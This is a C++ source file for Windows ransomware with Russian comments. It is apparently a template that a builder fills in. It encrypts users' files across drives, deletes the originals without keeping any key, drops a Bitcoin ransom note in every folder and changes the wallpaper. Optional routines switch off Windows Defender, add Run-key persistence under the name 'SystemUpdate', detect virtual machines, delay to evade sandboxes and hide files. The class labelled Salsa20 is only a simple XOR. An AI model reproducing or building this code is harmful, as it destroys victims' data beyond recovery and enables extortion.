#include <windows.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <fstream>
#include <vector>
#include <string>
#include <filesystem>
#include <thread>
#include <random>
#include <chrono>
#include <algorithm>
#include <sstream>
#include <ctime>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "crypt32.lib")

// ============================================================
// ЗАГЛУШКИ — БУДУТ ЗАМЕНЕНЫ БИЛДЕРОМ
// ============================================================
#define ALGO_PLACEHOLDER 0
#define DRIVES_PLACEHOLDER "C:\\|D:\\"
#define FOLDERS_INCLUDE_PLACEHOLDER ""
#define FOLDERS_EXCLUDE_PLACEHOLDER "C:\\Windows|C:\\Program Files|C:\\Program Files (x86)"
#define EXTS_PLACEHOLDER ".txt|.doc|.docx"
#define ENCRYPTED_EXT_PLACEHOLDER ".enc"
#define NOTE_NAME_PLACEHOLDER "READ_ME.txt"
#define NOTE_CONTENT_PLACEHOLDER "YOUR FILES ARE ENCRYPTED!\n\nSend 0.5 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\nAfter payment, contact: decrypt@protonmail.com"
#define FAKE_PROCESS_NAME_PLACEHOLDER "svchost.exe"
#define FAKE_PROCESS_ENABLED_PLACEHOLDER 0
#define HIDE_PROCESS_ENABLED_PLACEHOLDER 0
#define ANTI_VM_ENABLED_PLACEHOLDER 0
#define DISABLE_DEFENDER_ENABLED_PLACEHOLDER 0
#define ADD_PERSISTENCE_ENABLED_PLACEHOLDER 0
#define HIDE_FILES_ENABLED_PLACEHOLDER 0
#define SANDBOX_DELAY_ENABLED_PLACEHOLDER 0

// ============================================================
// РЕСУРСЫ — КАРТИНКА ОБОЕВ ВШИТА В EXE
// ============================================================
#define IDB_WALLPAPER 101

// ============================================================
// AES-256-CBC (Windows CryptoAPI) — РАБОТАЕТ НА WINLATOR
// ============================================================
class AES_CBC {
private:
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    unsigned char key[32];
    unsigned char iv[16];
    
public:
    AES_CBC() : hProv(NULL), hKey(NULL) {
        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
            return;
        }
        
        for (int i = 0; i < 32; i++) key[i] = rand() % 256;
        for (int i = 0; i < 16; i++) iv[i] = rand() % 256;
        
        struct {
            BLOBHEADER hdr;
            DWORD keySize;
            BYTE keyBytes[32];
        } keyBlob;
        
        keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
        keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
        keyBlob.hdr.reserved = 0;
        keyBlob.hdr.aiKeyAlg = CALG_AES_256;
        keyBlob.keySize = 32;
        memcpy(keyBlob.keyBytes, key, 32);
        
        CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey);
        
        DWORD mode = CRYPT_MODE_CBC;
        CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);
        CryptSetKeyParam(hKey, KP_IV, iv, 0);
    }
    
    ~AES_CBC() {
        if (hKey) CryptDestroyKey(hKey);
        if (hProv) CryptReleaseContext(hProv, 0);
    }
    
    bool Encrypt(const std::vector<BYTE>& input, std::vector<BYTE>& output) {
        if (!hKey || input.empty()) return false;
        
        DWORD dataLen = input.size();
        DWORD encLen = dataLen + 16;
        
        output.resize(encLen + 16);
        memcpy(output.data(), iv, 16);
        memcpy(output.data() + 16, input.data(), dataLen);
        
        DWORD outLen = dataLen;
        if (!CryptEncrypt(hKey, 0, TRUE, 0, output.data() + 16, &outLen, encLen)) {
            return false;
        }
        
        output.resize(outLen + 16);
        return true;
    }
};

// ============================================================
// SALSA20 (быстрое потоковое шифрование)
// ============================================================
class Salsa20 {
private:
    unsigned char key[32];
    unsigned char nonce[8];
    
public:
    Salsa20() {
        for (int i = 0; i < 32; i++) key[i] = rand() % 256;
        for (int i = 0; i < 8; i++) nonce[i] = rand() % 256;
    }
    
    void Encrypt(const std::vector<BYTE>& input, std::vector<BYTE>& output) {
        output.resize(input.size() + 8);
        memcpy(output.data(), nonce, 8);
        
        for (size_t i = 0; i < input.size(); i++) {
            output[8 + i] = input[i] ^ (key[i % 32] ^ nonce[i % 8]);
        }
    }
};

// ============================================================
// RSA (Windows CryptoAPI)
// ============================================================
class RSA_Encrypt {
private:
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    
public:
    RSA_Encrypt() : hProv(NULL), hKey(NULL) {
        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
            return;
        }
        CryptGenKey(hProv, CALG_RSA_KEYX, 2048 << 16, &hKey);
    }
    
    ~RSA_Encrypt() {
        if (hKey) CryptDestroyKey(hKey);
        if (hProv) CryptReleaseContext(hProv, 0);
    }
    
    bool Encrypt(const std::vector<BYTE>& input, std::vector<BYTE>& output) {
        if (!hKey || input.empty()) return false;
        
        DWORD encLen = 0;
        DWORD dataLen = input.size();
        CryptEncrypt(hKey, 0, TRUE, 0, NULL, &dataLen, 0);
        encLen = dataLen;
        
        output.resize(encLen);
        memcpy(output.data(), input.data(), input.size());
        
        DWORD outLen = input.size();
        if (!CryptEncrypt(hKey, 0, TRUE, 0, output.data(), &outLen, encLen)) {
            return false;
        }
        return true;
    }
};

// ============================================================
// ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
// ============================================================
std::vector<std::string> split_string(const std::string& str, char delimiter) {
    std::vector<std::string> result;
    std::stringstream ss(str);
    std::string item;
    while (std::getline(ss, item, delimiter)) {
        if (!item.empty()) result.push_back(item);
    }
    return result;
}

// ============================================================
// УСТАНОВКА ОБОЕВ ИЗ РЕСУРСОВ
// ============================================================
void set_wallpaper_from_resource() {
    // Получаем ресурс (картинку)
    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(IDB_WALLPAPER), "IMAGE");
    if (!hRes) return;
    
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return;
    
    DWORD size = SizeofResource(NULL, hRes);
    BYTE* data = (BYTE*)LockResource(hData);
    if (!data || size == 0) return;
    
    // Сохраняем во временную папку
    char temp_path[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_path);
    std::string wall_path = std::string(temp_path) + "wall.jpg";
    
    std::ofstream out(wall_path, std::ios::binary);
    out.write((char*)data, size);
    out.close();
    
    if (GetFileAttributesA(wall_path.c_str()) == INVALID_FILE_ATTRIBUTES) {
        return;
    }
    
    // Устанавливаем обои
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)wall_path.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
}

void add_persistence() {
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "SystemUpdate", 0, REG_SZ, (BYTE*)exe_path, strlen(exe_path) + 1);
        RegCloseKey(hKey);
    }
}

void hide_files(const std::string& ext) {
    char drives[256];
    GetLogicalDriveStringsA(256, drives);
    
    for (char* d = drives; *d; d += strlen(d) + 1) {
        std::string drive = d;
        try {
            for (auto& entry : std::filesystem::recursive_directory_iterator(drive)) {
                if (entry.is_regular_file()) {
                    std::string path = entry.path().string();
                    if (path.length() >= ext.length() && path.substr(path.length() - ext.length()) == ext) {
                        SetFileAttributesA(path.c_str(), FILE_ATTRIBUTE_HIDDEN);
                    }
                }
            }
        } catch (...) {}
    }
}

bool detect_vm() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(snap, &pe)) {
            do {
                std::string name = pe.szExeFile;
                std::transform(name.begin(), name.end(), name.begin(), ::tolower);
                if (name.find("vbox") != std::string::npos ||
                    name.find("vmware") != std::string::npos ||
                    name.find("virtual") != std::string::npos ||
                    name.find("qemu") != std::string::npos) {
                    CloseHandle(snap);
                    return true;
                }
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }
    return false;
}

void disable_defender() {
    system("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
}

void fake_process_name() {
    SetConsoleTitleA(FAKE_PROCESS_NAME_PLACEHOLDER);
}

void hide_process() {
    try {
        SetProcessInformation(GetCurrentProcess(), (PROCESS_INFORMATION_CLASS)3, NULL, 0);
    } catch (...) {}
}

// ============================================================
// ШИФРОВАНИЕ ФАЙЛОВ
// ============================================================
void encrypt_file(const std::string& path, const std::string& ext, int algo) {
    try {
        std::ifstream in(path, std::ios::binary);
        if (!in) return;
        
        std::vector<BYTE> data((std::istreambuf_iterator<char>(in)), {});
        in.close();
        
        if (data.empty()) return;
        
        std::vector<BYTE> encrypted;
        bool success = false;
        
        switch (algo) {
            case 0: {
                AES_CBC aes;
                success = aes.Encrypt(data, encrypted);
                break;
            }
            case 1: {
                Salsa20 salsa;
                salsa.Encrypt(data, encrypted);
                success = true;
                break;
            }
            case 2: {
                RSA_Encrypt rsa;
                success = rsa.Encrypt(data, encrypted);
                break;
            }
            default: return;
        }
        
        if (!success || encrypted.empty()) return;
        
        std::string out_path = path + ext;
        std::ofstream out(out_path, std::ios::binary);
        out.write((char*)encrypted.data(), encrypted.size());
        out.close();
        
        DeleteFileA(path.c_str());
    } catch (...) {}
}

// ============================================================
// ОБХОД ПАПОК И ШИФРОВАНИЕ
// ============================================================
void walk_and_encrypt(const std::string& start_path,
                      const std::vector<std::string>& extensions,
                      const std::vector<std::string>& exclude_folders,
                      const std::string& encrypted_ext,
                      int algo) {
    try {
        for (auto& entry : std::filesystem::recursive_directory_iterator(start_path)) {
            if (entry.is_directory()) continue;
            
            std::string full_path = entry.path().string();
            bool excluded = false;
            for (const auto& ex : exclude_folders) {
                if (full_path.find(ex) == 0) {
                    excluded = true;
                    break;
                }
            }
            if (excluded) continue;
            
            std::string ext = entry.path().extension().string();
            std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
            if (std::find(extensions.begin(), extensions.end(), ext) != extensions.end()) {
                encrypt_file(full_path, encrypted_ext, algo);
            }
        }
    } catch (...) {}
}

// ============================================================
// ФАЙЛЫ ВЫКУПА (В КАЖДОЙ ПАПКЕ)
// ============================================================
void drop_notes(const std::vector<std::string>& drives,
                const std::vector<std::string>& exclude_folders,
                const std::string& note_name,
                const std::string& note_content) {
    for (const auto& drive : drives) {
        try {
            for (auto& entry : std::filesystem::recursive_directory_iterator(drive)) {
                if (entry.is_directory()) {
                    std::string note_path = entry.path().string() + "\\" + note_name;
                    
                    bool excluded = false;
                    for (const auto& ex : exclude_folders) {
                        if (entry.path().string().find(ex) == 0) {
                            excluded = true;
                            break;
                        }
                    }
                    if (excluded) continue;
                    
                    if (!std::filesystem::exists(note_path)) {
                        std::ofstream out(note_path);
                        out << note_content;
                        out.close();
                    }
                }
            }
        } catch (...) {}
    }
}

// ============================================================
// ГЛАВНАЯ ФУНКЦИЯ
// ============================================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    srand(GetTickCount() ^ GetCurrentProcessId());
    
    if (ANTI_VM_ENABLED_PLACEHOLDER && detect_vm()) return 0;
    if (FAKE_PROCESS_ENABLED_PLACEHOLDER) fake_process_name();
    if (HIDE_PROCESS_ENABLED_PLACEHOLDER) hide_process();
    if (DISABLE_DEFENDER_ENABLED_PLACEHOLDER) disable_defender();
    if (ADD_PERSISTENCE_ENABLED_PLACEHOLDER) add_persistence();
    if (SANDBOX_DELAY_ENABLED_PLACEHOLDER) Sleep(60000);
    
    std::string drives_str = DRIVES_PLACEHOLDER;
    std::string exts_str = EXTS_PLACEHOLDER;
    std::string exclude_str = FOLDERS_EXCLUDE_PLACEHOLDER;
    std::string encrypted_ext = ENCRYPTED_EXT_PLACEHOLDER;
    
    auto drives = split_string(drives_str, '|');
    auto extensions = split_string(exts_str, '|');
    auto exclude_folders = split_string(exclude_str, '|');
    int algo = ALGO_PLACEHOLDER;
    
    std::vector<std::thread> threads;
    for (const auto& drive : drives) {
        threads.emplace_back(walk_and_encrypt, drive, std::ref(extensions),
                           std::ref(exclude_folders), std::ref(encrypted_ext), algo);
    }
    for (auto& t : threads) t.join();
    
    if (HIDE_FILES_ENABLED_PLACEHOLDER) hide_files(encrypted_ext);
    
    std::string note_name = NOTE_NAME_PLACEHOLDER;
    std::string note_content = NOTE_CONTENT_PLACEHOLDER;
    drop_notes(drives, exclude_folders, note_name, note_content);
    
    // Установка обоев из ресурсов
    set_wallpaper_from_resource();
    
    return 0;
}
